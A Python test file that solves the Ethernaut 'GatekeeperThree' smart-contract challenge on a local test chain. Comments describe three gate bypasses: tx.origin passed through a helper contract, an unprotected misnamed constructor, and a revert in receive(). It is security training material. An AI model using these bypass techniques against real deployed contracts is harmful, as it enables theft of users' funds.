from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv28_gatekeeper_three import GatekeeperThree
from pytypes.contracts.attacker.lv28_gatekeeper_three_attacker import GatekeeperThreeAttacker

@default_chain.connect()
def test_lv28():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv28()
    exploit_lv28(contract)
    ethernaut.check_lv28(contract)

def exploit_lv28(contract: GatekeeperThree):
    # Attack vector - gate 1: tx.origin is not changed in redirect => helper contract can be used + unsecured construction method construct0r()
    # Attack vector - gate 2: calling createTrick() and getAllowance() in the same tx => value of block.timestamp is the same
    # Attack vector - gate 3: sending some ether to the contract and revert on receive()
    # Training: know what attacker can have under his controll

    attacker = GatekeeperThreeAttacker.deploy(contract)
    attacker.bypassGate1()
    attacker.bypassGate2()
    attacker.bypassGate3(value=10**18)
    attacker.enter()
